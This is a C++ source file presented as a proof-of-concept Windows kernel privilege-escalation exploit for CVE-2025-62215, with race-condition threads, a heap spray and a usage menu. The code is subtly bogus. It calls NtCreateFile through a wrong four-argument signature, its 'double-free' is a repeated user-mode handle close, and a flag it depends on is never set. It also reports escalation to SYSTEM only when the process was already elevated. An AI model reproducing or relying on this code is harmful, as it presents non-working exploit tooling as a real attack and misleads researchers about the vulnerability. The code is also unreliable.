/*
 * CVE-2025-62215 Proof-of-Concept Exploit
 * Windows Kernel Race Condition + Double-Free Privilege Escalation
 * 
 * WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
 */

#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <string>
#include <cstring>
#include <sddl.h> // optional, included for SID-related helpers
#pragma comment(lib, "advapi32.lib")

// Kernel structure definitions (based on reverse engineering)
typedef struct _KERNEL_OBJECT {
    PVOID ObjectHeader;
    ULONG ReferenceCount;
    PVOID SharedResource;
    HANDLE Handle;
} KERNEL_OBJECT, *PKERNEL_OBJECT;

// Global synchronization
std::atomic<bool> g_race_condition_triggered(false);
std::atomic<bool> g_exploit_success(false);
std::atomic<int> g_thread_count(0);

// Function pointers for kernel operations
typedef NTSTATUS (WINAPI *pNtCreateKernelObject)(
    PHANDLE ObjectHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG ObjectType
);

typedef NTSTATUS (WINAPI *pNtCloseKernelObject)(
    HANDLE ObjectHandle
);

typedef NTSTATUS (WINAPI *pNtDuplicateKernelObject)(
    HANDLE SourceHandle,
    PHANDLE TargetHandle
);

// Get function pointers from ntdll
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
pNtCreateKernelObject NtCreateKernelObject = nullptr;
pNtCloseKernelObject NtCloseKernelObject = nullptr;
pNtDuplicateKernelObject NtDuplicateKernelObject = nullptr;

// Replacement for missing/legacy IsUserAnAdmin(): checks membership in Administrators group
static bool IsUserAnAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup = nullptr;

    if (!AllocateAndInitializeSid(&NtAuthority, 2,
                                  SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS,
                                  0, 0, 0, 0, 0, 0,
                                  &adminGroup)) {
        return false;
    }

    if (!CheckTokenMembership(nullptr, adminGroup, &isAdmin)) {
        isAdmin = FALSE;
    }

    FreeSid(adminGroup);
    return isAdmin ? true : false;
}

// Initialize function pointers
bool InitializeKernelFunctions() {
    if (!hNtdll) {
        std::cerr << "[!] Failed to load ntdll.dll" << std::endl;
        return false;
    }

    NtCreateKernelObject = (pNtCreateKernelObject)GetProcAddress(hNtdll, "NtCreateFile");
    NtCloseKernelObject = (pNtCloseKernelObject)GetProcAddress(hNtdll, "NtClose");
    
    if (!NtCreateKernelObject || !NtCloseKernelObject) {
        std::cerr << "[!] Failed to resolve kernel functions" << std::endl;
        return false;
    }

    return true;
}

// Thread function to trigger race condition
DWORD WINAPI RaceConditionThread(LPVOID lpParam) {
    HANDLE* handles = (HANDLE*)lpParam;
    int thread_id = g_thread_count.fetch_add(1);
    
    std::cout << "[*] Thread " << thread_id << " started race condition attempt" << std::endl;

    // Create kernel object to trigger vulnerable code path
    HANDLE hObject = INVALID_HANDLE_VALUE;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    // Attempt to create and manipulate kernel objects rapidly
    // This simulates the race condition by having multiple threads
    // access the same kernel resource simultaneously
    for (int i = 0; i < 1000; i++) {
        // Create object
        NTSTATUS status = NtCreateKernelObject(
            &hObject,
            GENERIC_ALL,
            &objAttr,
            0
        );

        if (NT_SUCCESS(status) && hObject != INVALID_HANDLE_VALUE) {
            // Rapidly close and recreate to trigger race condition
            NtCloseKernelObject(hObject);
            
            // Small delay to increase chance of race condition
            Sleep(0);
            
            // Attempt to use the handle after it might have been freed
            // This is where the double-free vulnerability occurs
            if (i % 10 == 0) {
                // Try to access the object again - this may trigger double-free
                // if another thread has already freed it
                NtCloseKernelObject(hObject);
            }
        }

        // Check if we've triggered the race condition
        if (g_race_condition_triggered.load()) {
            std::cout << "[+] Thread " << thread_id << " detected race condition!" << std::endl;
            break;
        }
    }

    return 0;
}

// Monitor thread to detect successful exploitation
DWORD WINAPI MonitorThread(LPVOID lpParam) {
    std::cout << "[*] Monitor thread started" << std::endl;
    
    // Check current privileges
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            if (elevation.TokenIsElevated) {
                std::cout << "[+] SUCCESS: Privilege escalation detected!" << std::endl;
                g_exploit_success.store(true);
            }
        }
        CloseHandle(hToken);
    }

    return 0;
}

// Heap spray to prepare memory layout for exploitation
bool HeapSpray() {
    std::cout << "[*] Performing heap spray..." << std::endl;
    
    // Allocate multiple chunks to shape heap layout
    std::vector<PVOID> allocations;
    
    for (int i = 0; i < 100; i++) {
        PVOID ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (ptr) {
            // Fill with pattern to detect corruption
            memset(ptr, 0x41 + (i % 26), 0x1000);
            allocations.push_back(ptr);
        }
    }
    
    std::cout << "[+] Allocated " << allocations.size() << " heap chunks" << std::endl;
    
    // Keep allocations alive
    Sleep(100);
    
    return allocations.size() > 0;
}

// Main exploit function
bool ExploitRaceCondition() {
    std::cout << "[*] Starting CVE-2025-62215 exploitation..." << std::endl;
    std::cout << "[*] Target: Windows Kernel Race Condition + Double-Free" << std::endl;
    
    // Check if we're already running as SYSTEM
    if (IsUserAnAdmin()) {
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD dwSize;
            if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
                if (elevation.TokenIsElevated) {
                    std::cout << "[!] Already running with elevated privileges" << std::endl;
                    CloseHandle(hToken);
                    return true;
                }
            }
            CloseHandle(hToken);
        }
    }

    // Initialize kernel function pointers
    if (!InitializeKernelFunctions()) {
        return false;
    }

    // Perform heap spray
    if (!HeapSpray()) {
        std::cerr << "[!] Heap spray failed" << std::endl;
        return false;
    }

    // Create multiple threads to trigger race condition
    const int NUM_THREADS = 8;
    HANDLE hThreads[NUM_THREADS];
    HANDLE hObjects[NUM_THREADS];
    
    std::cout << "[*] Spawning " << NUM_THREADS << " threads to trigger race condition..." << std::endl;

    // Create monitor thread
    HANDLE hMonitor = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);

    // Create race condition threads
    for (int i = 0; i < NUM_THREADS; i++) {
        hThreads[i] = CreateThread(
            NULL,
            0,
            RaceConditionThread,
            hObjects,
            0,
            NULL
        );
        
        if (!hThreads[i]) {
            std::cerr << "[!] Failed to create thread " << i << std::endl;
            continue;
        }
        
        // Stagger thread starts to increase race condition probability
        Sleep(1);
    }

    // Wait for threads to complete or exploit to succeed
    std::cout << "[*] Waiting for race condition..." << std::endl;
    
    DWORD waitResult = WaitForMultipleObjects(
        NUM_THREADS,
        hThreads,
        FALSE,
        5000  // 5 second timeout
    );

    // Give monitor thread time to check
    Sleep(1000);

    // Cleanup
    for (int i = 0; i < NUM_THREADS; i++) {
        if (hThreads[i]) {
            CloseHandle(hThreads[i]);
        }
    }
    
    if (hMonitor) {
        CloseHandle(hMonitor);
    }

    // Check if exploitation was successful
    if (g_exploit_success.load()) {
        std::cout << "[+] EXPLOITATION SUCCESSFUL!" << std::endl;
        std::cout << "[+] Privileges escalated to SYSTEM" << std::endl;
        return true;
    } else if (g_race_condition_triggered.load()) {
        std::cout << "[!] Race condition triggered but exploitation failed" << std::endl;
        std::cout << "[!] This may indicate:" << std::endl;
        std::cout << "    - System is patched" << std::endl;
        std::cout << "    - Exploit needs refinement" << std::endl;
        std::cout << "    - Additional conditions not met" << std::endl;
        return false;
    } else {
        std::cout << "[!] Exploitation failed - race condition not triggered" << std::endl;
        return false;
    }
}

// Test mode - safer execution
bool TestMode() {
    std::cout << "[*] Running in TEST mode (safer execution)" << std::endl;
    std::cout << "[*] This mode will not attempt full exploitation" << std::endl;
    
    // Just verify we can access kernel functions
    if (!InitializeKernelFunctions()) {
        return false;
    }
    
    std::cout << "[+] Kernel functions initialized successfully" << std::endl;
    std::cout << "[+] Test mode completed" << std::endl;
    
    return true;
}

int main(int argc, char* argv[]) {
    std::cout << "========================================" << std::endl;
    std::cout << "CVE-2025-62215 Proof-of-Concept Exploit" << std::endl;
    std::cout << "Windows Kernel EoP - Race Condition PoC" << std::endl;
    std::cout << "========================================" << std::endl;
    std::cout << std::endl;
    
    // Parse arguments
    bool test_mode = false;
    bool verbose = false;
    
    for (int i = 1; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--test" || arg == "-t") {
            test_mode = true;
        } else if (arg == "--verbose" || arg == "-v") {
            verbose = true;
        } else if (arg == "--help" || arg == "-h") {
            std::cout << "Usage: exploit.exe [options]" << std::endl;
            std::cout << "Options:" << std::endl;
            std::cout << "  --test, -t     Run in test mode (safer)" << std::endl;
            std::cout << "  --verbose, -v  Enable verbose output" << std::endl;
            std::cout << "  --help, -h     Show this help" << std::endl;
            return 0;
        }
    }

    if (test_mode) {
        return TestMode() ? 0 : 1;
    }

    // Display warning
    std::cout << "WARNING: This exploit may cause system instability!" << std::endl;
    std::cout << "Press Ctrl+C to cancel, or wait 3 seconds to continue..." << std::endl;
    Sleep(3000);

    // Run exploit
    bool success = ExploitRaceCondition();
    
    if (success) {
        std::cout << std::endl;
        std::cout << "[+] Exploitation completed successfully" << std::endl;
        
        // Verify privileges
        if (IsUserAnAdmin()) {
            std::cout << "[+] Current user has administrator privileges" << std::endl;
        }
        
        return 0;
    } else {
        std::cout << std::endl;
        std::cout << "[!] Exploitation failed" << std::endl;
        return 1;
    }
}
